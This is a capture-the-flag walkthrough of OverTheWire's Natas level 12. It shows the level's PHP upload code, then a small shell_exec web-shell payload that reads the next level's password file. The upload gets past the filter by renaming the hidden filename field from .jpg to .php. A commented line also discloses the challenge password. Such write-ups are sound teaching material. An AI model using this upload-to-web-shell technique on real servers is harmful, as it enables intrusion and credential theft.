We will log into the next level of the challenge using the credentials obtained from the previous level.

![untitled](ScreenShots/Level%2011%20->%2012.jpg)

We can observe the PHP code used in this level:
```php
<?php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {}
?>
```
From this code, it's evident that the server allows the upload of files with a specified filename.  
The goal is to upload a `PHP` script disguised as a `JPG` file to execute on the server.  
This will require bypassing the file extension restriction.

---
**Executing Terminal Commands in PHP**  
To execute commands on the server, we can use the shell_exec function in PHP.  
Official documentation and resources, such as [PHP.net](https://www.php.net/manual/en/function.shell-exec.php) and [GeeksforGeeks](https://www.geeksforgeeks.org/php-shell_exec-vs-exec-function/), provide insights into using this function.

---
We need to create a PHP file that outputs the password for the next level, stored in the `natas_webpass` directory. Using the `shell_exec` function, we can achieve this.  
Below is the PHP code for our payload:
```php
<?php 
$output = shell_exec('cat /etc/natas_webpass/natas13'); 
echo "<pre>$output</pre>"; 
?> 
```
Save this code to a `.php` file.  
The critical step is to ensure the server accepts it as a PHP file, not a `.jpg` file.  
From the source code, we see:
```html
<input type="hidden" name="filename" value="t39pfqfvta.jpg" />
```
When a file is uploaded, it gets renamed. We need to change this to a `.php` extension and upload our PHP file.  
Once uploaded, this file will reveal the password for the next level.

After obtaining the password, you can log into the next level using the following credentials:
```
URL: http://natas13.natas.labs.overthewire.org
Username: natas13
Password: Password obtained via uploading our PHP file
```
<!-- Password: `lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9` -->